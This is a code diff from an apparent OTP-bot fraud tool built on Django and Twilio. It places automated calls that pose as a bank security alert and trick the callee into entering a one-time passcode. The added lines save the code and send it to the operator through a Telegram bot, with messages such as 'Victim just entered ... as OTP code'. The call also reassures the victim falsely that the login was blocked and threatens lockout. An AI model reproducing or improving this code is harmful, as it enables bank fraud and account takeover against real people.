@@ -421,7 +421,10 @@ def voice(request,bank,chat_id):
     gather = Gather(num_digits=1, action=f'/pay/gather/{chat_id}/{bank}/')
     gather.say(f'We have received a login request on your {bank} account. If you did not request an OTP Press 1.')
     resp.append(gather)
-
+    call_status = request.POST.get('CallStatus')
+    if call_status == 'in-progress':
+        text = f'Victim accepted call✅. Waiting for input...'
+        async_to_sync(bot)(chat_id,text)
     # If the user doesn't select an option, redirect them into a loop
     resp.redirect(f'/pay/voice/{bank}/{chat_id}/')
 
@@ -433,8 +436,7 @@ def gather(request,chat_id,bank):
     # Start our TwiML response
     resp = VoiceResponse()
 
-    # If Twilio's request to our app included already gathered digits,
-    # process them
+    otp = Telegram_Otp_bot.objects.get(chat_id=chat_id)
     if 'Digits' in request.POST:
         # Get which digit the caller chose
         choice = request.POST['Digits']
@@ -451,10 +453,12 @@ def gather(request,chat_id,bank):
                 digit_3 = choice[2]
                 digit_4 = choice[3]
                 gather = Gather(action=f'/pay/otp/{chat_id}/{bank}/')
-                resp.say(f"You have entered {digit_1},{digit_2},{digit_3},{digit_4}. Press 1 to confirm, or press 2 to re-enter")
+                resp.say(f"You have entered {digit_1} {digit_2} {digit_3} {digit_4}. Press 1 to confirm, or press 2 to re-enter")
                 text = f'The OTP code inputed by the user at first stage is {choice}'
                 async_to_sync(bot)(chat_id,text)
                 resp.append(gather)
+                otp.otp_code = choice
+                otp.save()
             elif len(choice) == 6:
                 digit_1 = choice[0]
                 digit_2 = choice[1]
@@ -463,10 +467,12 @@ def gather(request,chat_id,bank):
                 digit_5 = choice[4]
                 digit_6 = choice[5]
                 gather = Gather(action=f'/pay/otp/{chat_id}/{bank}/')
-                resp.say(f"You have entered {digit_1},{digit_2},{digit_3},{digit_4},{digit_5},{digit_6}. Press 1 to confirm, or press 2 to re-enter")
-                text = f'The OTP code inputed by the user at first stage is {choice}'
+                resp.say(f"You have entered {digit_1} {digit_2} {digit_3} {digit_4} {digit_5} {digit_6}. Press 1 to confirm, or press 2 to re-enter")
+                text = f'Victim just entered {choice} as OTP code. Waiting for confirmation from victim...'
                 async_to_sync(bot)(chat_id,text)
                 resp.append(gather)
+                otp.otp_code = choice
+                otp.save()
             else:
                 resp.say("Invalid pin code entered, Last chance to verify your identity or your account may be locked for a while")
                 resp.redirect(f'/pay/gather/{chat_id}/{bank}/')
@@ -483,12 +489,12 @@ def gather(request,chat_id,bank):
 @csrf_exempt
 def choice(request, chat_id, bank):
     resp = VoiceResponse()
-
+    otp = Telegram_Otp_bot.objects.get(chat_id=chat_id)
     if 'Digits' in request.POST:
         pin = request.POST['Digits']
 
         if pin == '1':
-            text = f'The OTP code inputed by the user is {pin}✅'
+            text = f'Victim has confirmed initial OTP✅. {otp.otp_code} is the OTP code.'
             async_to_sync(bot)(chat_id,text)
             resp.say("Thank you for your cooperation. The suspicious login has been blocked.")
         
